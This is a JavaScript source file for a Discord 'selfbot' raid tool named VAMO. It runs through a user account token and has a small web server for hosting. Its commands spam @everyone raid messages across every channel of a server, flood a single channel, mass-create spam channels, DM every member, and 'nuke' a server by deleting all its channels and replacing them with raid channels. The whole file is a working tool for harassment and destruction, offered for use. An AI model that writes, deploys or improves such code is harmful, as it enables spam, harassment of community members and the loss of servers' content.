const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('VAMO selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`VAMO RAID SELFBOT READY`);
    console.log(`!syncspam - All channels get message #1 together, then #2 together, etc.`);
});

// Your exact raid message
const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

// Helper function for delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== SYNC SPAM - ALL CHANNELS TOGETHER =====
    if (command === 'syncspam') {
        const guild = message.guild;
        if (!guild) return;

        // Send activation message
        await message.channel.send('✅ VAMO ACTIVATED');
        
        // Get all text channels
        const channels = guild.channels.cache.filter(c => 
            c.type === 'GUILD_TEXT' && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        const channelList = [...channels.values()];
        const channelCount = channelList.length;
        
        console.log(`🔥 SYNC SPAM: ${channelCount} channels will get messages #1-100 TOGETHER`);

        let totalSent = 0;
        let failedMessages = 0;

        // For each message number (1 to 100)
        for (let messageNum = 1; messageNum <= 100; messageNum++) {
            console.log(`\n📢 Sending message #${messageNum} to ALL ${channelCount} channels simultaneously...`);
            
            // Create an array of promises - one for each channel
            const sendPromises = channelList.map(async (channel) => {
                try {
                    await channel.send(raidMessage);
                    return { success: true, channel: channel.name };
                } catch (error) {
                    console.log(`   ❌ Failed in #${channel.name} for message #${messageNum}: ${error.message}`);
                    failedMessages++;
                    return { success: false, channel: channel.name };
                }
            });

            // Wait for ALL channels to receive THIS message number
            const results = await Promise.allSettled(sendPromises);
            
            const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
            totalSent += successful;
            
            console.log(`   ✅ Message #${messageNum} sent to ${successful}/${channelCount} channels`);
            
            // Delay between message rounds (all channels rest together)
            const waitTime = 1500; // 1.5 seconds between rounds
            console.log(`   ⏱️  Waiting ${waitTime/1000}s before next round...`);
            await delay(waitTime);
        }

        console.log('\n' + '='.repeat(60));
        console.log(`✅ SYNC SPAM COMPLETE!`);
        console.log(`📊 Total messages sent: ${totalSent}`);
        console.log(`📊 Failed messages: ${failedMessages}`);
        console.log(`📊 Channels used: ${channelCount}`);
        console.log(`📊 Messages per channel: 100`);
        console.log('='.repeat(60));
    }

    // ===== FLOOD CURRENT CHANNEL =====
    if (command === 'flood') {
        await message.channel.send('✅ VAMO ACTIVATED');
        
        const count = parseInt(args[0]) || 100;
        const channel = message.channel;

        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name}...`);

        for (let i = 1; i <= count; i++) {
            try {
                await channel.send(raidMessage);
                
                if (i % 10 === 0) {
                    console.log(`   ✅ ${i}/${count} messages sent`);
                }
                
                await delay(1000); // 1 second delay
                
            } catch (error) {
                console.log(`   ❌ Failed message ${i}: ${error.message}`);
                
                if (error.message.includes('rate')) {
                    console.log('   ⏳ Rate limited, waiting 5 seconds...');
                    await delay(5000);
                }
            }
        }

        console.log(`✅ FLOOD COMPLETE`);
    }

    // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        let channelCount = parseInt(args[0]) || 50;
        if (channelCount > 100) channelCount = 100;

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        console.log(`🔥 Creating ${channelCount} channels...`);

        for (let i = 1; i <= channelCount; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/${channelCount}`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }
    }

    // ===== MASS DM COMMAND =====
    if (command === 'massdm') {
        const guild = message.guild;
        await message.channel.send('✅ VAMO ACTIVATED');

        console.log(`🔥 Mass DM to members...`);

        let sent = 0;

        for (const member of guild.members.cache.values()) {
            if (member.user.bot || member.id === client.user.id) continue;

            try {
                await member.send(raidMessage);
                sent++;
                
                if (sent % 10 === 0) {
                    console.log(`✅ DMs sent: ${sent}`);
                }
                
                await delay(1200);
                
            } catch (e) {
                // Ignore failed DMs
            }
        }

        console.log(`✅ MassDM complete: Sent to ${sent} members`);
    }

    // ===== NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        // Delete all channels
        console.log('🔥 Deleting all channels...');
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                console.log(`✅ Deleted ${channel.name}`);
                await delay(800);
            } catch (error) {
                console.log(`❌ Failed to delete: ${error.message}`);
            }
        }

        // Create 100 channels
        console.log('🔥 Creating 100 channels...');
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/100`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log('✅ NUKE COMPLETE');
    }

    // ===== HELP COMMAND =====
    if (command === 'help') {
        await message.channel.send(`**🔥 VAMO RAID SELFBOT**

!syncspam - ALL channels get message #1 together, #2 together (100 each)
!flood [count] - Flood current channel
!spamchannels [num] - Create raid channels
!massdm - DM all members
!nuke - Delete all + create 100 channels
!help - Show this menu

✅ VAMO ACTIVATED`);
    }
});

client.login(TOKEN);
